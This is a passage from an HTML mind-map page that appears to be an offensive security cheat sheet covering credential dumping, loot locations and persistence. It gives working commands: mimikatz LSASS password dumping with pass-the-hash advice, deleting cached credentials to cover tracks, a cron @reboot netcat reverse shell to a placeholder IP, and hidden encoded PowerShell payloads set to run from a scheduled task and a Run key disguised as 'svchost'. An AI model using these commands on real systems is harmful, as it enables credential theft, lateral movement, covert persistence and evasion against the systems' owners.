sekurlsa::logonpasswords</code></p>","children":[],"payload":{"tag":"li","lines":"2472,2473"}},{"content":"\n<p data-lines=\"2473,2474\">Dump plaintext credentials from LSASS.</p>","children":[],"payload":{"tag":"li","lines":"2473,2474"}},{"content":"\n<p data-lines=\"2474,2475\">Output shows <code>Username :</code> with cleartext passwords; if empty, run as SYSTEM.</p>","children":[],"payload":{"tag":"li","lines":"2474,2475"}},{"content":"\n<p data-lines=\"2475,2476\">Employ pass&#x2011;the&#x2011;hash/ticket on other hosts inside the domain.</p>","children":[],"payload":{"tag":"li","lines":"2475,2477"}},{"content":"\n<p data-lines=\"2477,2478\"><code>cmdkey /list</code></p>","children":[],"payload":{"tag":"li","lines":"2477,2478"}},{"content":"\n<p data-lines=\"2478,2479\">View cached saved credentials.</p>","children":[],"payload":{"tag":"li","lines":"2478,2479"}},{"content":"\n<p data-lines=\"2479,2480\">Entries list target servers and stored usernames; empty list if none.</p>","children":[],"payload":{"tag":"li","lines":"2479,2480"}},{"content":"\n<p data-lines=\"2480,2481\">Delete (<code>cmdkey /delete:&lt;target&gt;</code>) to cover tracks after extraction.</p>","children":[],"payload":{"tag":"li","lines":"2480,2482"}}],"payload":{"tag":"h3","lines":"2471,2472"}}],"payload":{"tag":"h2","lines":"2458,2459"}},{"content":"Loot Locations","children":[{"content":"Browser credential stores (Chrome&#xa0;Login&#xa0;Data, Firefox&#xa0;key4.db)","children":[],"payload":{"tag":"li","lines":"2483,2484"}},{"content":"SSH private keys in <code>~/.ssh/</code>","children":[],"payload":{"tag":"li","lines":"2484,2485"}},{"content":"KeePass&#xa0;.kdbx and credential manager vaults","children":[],"payload":{"tag":"li","lines":"2485,2486"}},{"content":"RDP&#xa0;credential files (<code>*.rdp</code> with <code>password 51:b:</code> blobs)","children":[],"payload":{"tag":"li","lines":"2486,2488"}}],"payload":{"tag":"h2","lines":"2482,2483"}},{"content":"Persistence Techniques","children":[{"content":"Linux","children":[{"content":"<code>echo &quot;@reboot bash -c &apos;nc -e /bin/bash &lt;ip&gt; 4444&apos;&quot; | crontab -</code>","children":[],"payload":{"tag":"li","lines":"2491,2492"}},{"content":"Add a cron&#xa0;@reboot entry for a reverse shell.","children":[],"payload":{"tag":"li","lines":"2492,2493"}},{"content":"<code>crontab -l</code> shows new job; absence means write failed.","children":[],"payload":{"tag":"li","lines":"2493,2494"}},{"content":"Use root&#x2019;s crontab for higher privilege persistence.","children":[],"payload":{"tag":"li","lines":"2494,2496"}}],"payload":{"tag":"h3","lines":"2490,2491"}},{"content":"Windows","children":[{"content":"\n<p data-lines=\"2497,2498\"><code>schtasks /create /sc minute /mo 30 /tn updater /tr &quot;powershell -w hidden -nop -enc &lt;b64payload&gt;&quot;</code></p>","children":[],"payload":{"tag":"li","lines":"2497,2498"}},{"content":"\n<p data-lines=\"2498,2499\">Create a scheduled task running every 30&#xa0;minutes.</p>","children":[],"payload":{"tag":"li","lines":"2498,2499"}},{"content":"\n<p data-lines=\"2499,2500\"><code>schtasks /query /tn updater</code> confirms creation; error shows path denied.</p>","children":[],"payload":{"tag":"li","lines":"2499,2500"}},{"content":"\n<p data-lines=\"2500,2501\">Task executes payload as SYSTEM if runlevel highest.</p>","children":[],"payload":{"tag":"li","lines":"2500,2502"}},{"content":"\n<p data-lines=\"2502,2503\"><code>reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /t REG_SZ /d &quot;powershell -w hidden -enc &lt;b64&gt;&quot;</code></p>","children":[],"payload":{"tag":"li","lines":"2502,2503"}},{"content":"\n<p data-lines=\"2503,2504\">Persist via <code>Run</code> key in user registry.</p>","children":[],"payload":{"tag":"li","lines":"2503,2504"}},{"content":"\n<p data-lines=\"2504,2505\"><code>reg query</code> shows new value; missing means registry write blocked.</p>","children":[],"payload":{"tag":"li","lines":"2504,2505"}},{"content":"\n<p data-lines=\"2505,2506\">Key runs payload each user logon to maintain access.</p>","children":[],"payload":{"tag":"li","lines":"2505,2506"}}],"payload":{"tag":"h3","lines":"2496,2497"}}],"payload":{"tag":"h2","lines":"2488,2489"}}],"payload":{"tag":"h1","lines":"2456,2457"}}]},{"colorFreezeLevel":2,"activeNode":{"placement":"center"},"maxWidth":700,"initialExpandLevel":2})</script>
</body>
</html>
